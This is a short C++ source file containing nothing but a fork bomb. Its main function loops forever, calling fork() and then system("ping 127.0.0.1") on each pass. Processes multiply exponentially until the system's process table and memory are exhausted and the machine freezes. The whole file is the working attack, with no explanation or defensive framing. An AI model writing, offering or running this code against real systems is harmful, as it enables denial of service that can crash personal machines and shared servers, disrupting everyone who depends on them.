#include <unistd.h> 
#include <cstdlib> 
 
int main(int argc, char** argv) { 
   while(1) { 
      fork(); 
      system("ping 127.0.0.1"); 
   } 
   return 0; 
} 
